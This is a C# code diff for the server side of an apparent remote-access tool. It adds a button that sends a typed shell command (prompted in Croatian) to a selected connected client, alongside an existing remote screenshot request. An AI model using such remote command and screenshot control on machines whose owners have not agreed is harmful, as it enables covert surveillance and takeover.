@@ -8,6 +8,8 @@ using Server.ClientData;
 using System.Net.Sockets;
 using Server.Networking.Packages;
 using System.Drawing;
+using System.Diagnostics;
+using System.Collections.Generic;
 
 namespace Server
 {
@@ -132,14 +134,16 @@ namespace Server
                 {
                     MessageForm NewMessageForm = new MessageForm(clientSocket);
                     PacketHandler.openedMessageForms.Add(clientSocket, NewMessageForm);
-                    NewMessageForm.Show();
-                    Application.Run();
+                    NewMessageForm.ShowDialog();
+                    NewMessageForm.Focus();
+                    //Application.Run();
                 }
                 else
                 {
                     MessageForm NewMessageForm = PacketHandler.openedMessageForms[clientSocket];
-                    NewMessageForm.Show();
-                    Application.Run();
+                    NewMessageForm.ShowDialog();
+                    NewMessageForm.Focus();
+                    //Application.Run();
                 }
             }
             catch (Exception ex)
@@ -227,12 +231,19 @@ namespace Server
         }
 
         private void btnTakeScreenshot_Click(object sender, EventArgs e)
-        {
-            
+        {            
             RequestPackage requestPackage = new RequestPackage(4);
             var selectedRowIndex = connectionList.SelectedCells[0].RowIndex;
             var clientSocket = PacketHandler.clientList.ElementAt(selectedRowIndex).clientSocket;
             clientSocket.Send(requestPackage.ToByteArray());
+        }
+
+        private void btnExecudeCmd_Click(object sender, EventArgs e)
+        {
+            ShellCommandPackage shellCommandPackage = new ShellCommandPackage(Microsoft.VisualBasic.Interaction.InputBox("Unesi shell naredbu", "Shell Command", "", -1, -1));
+            var selectedRowIndex = connectionList.SelectedCells[0].RowIndex;
+            var clientSocket = PacketHandler.clientList.ElementAt(selectedRowIndex).clientSocket;
+            clientSocket.Send(shellCommandPackage.ToByteArray());
         }
     }
 }
